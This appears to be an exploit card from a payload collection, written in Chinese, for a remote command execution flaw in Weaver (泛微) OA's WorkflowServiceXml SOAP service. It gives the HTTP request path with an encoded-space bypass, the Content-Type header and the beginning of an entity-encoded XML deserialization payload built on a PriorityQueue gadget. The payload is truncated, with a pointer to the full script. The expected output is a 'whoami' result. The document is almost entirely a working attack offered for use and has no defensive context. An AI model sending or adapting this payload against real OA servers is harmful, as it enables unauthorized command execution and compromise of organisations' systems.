# 泛微OAWorkflowServiceXmlRCE

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /services%20/WorkflowServiceXml HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
<soapenv:Header/>
<soapenv:Body>
<web:doCreateWorkflowRequest>
<web:string>&lt;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#32;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#61;&quot;&#99;&#117;&#115;&#116;&#111;&#109;&quot;&gt;&#13;&#10;&#32;&#32;&lt;&#117;&#110;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#98;&#108;&#101;&#45;&#112;&#97;&#114;&…（脚本共 27529 字，完整版见原文）
```
- **预期**：-1　|　whoami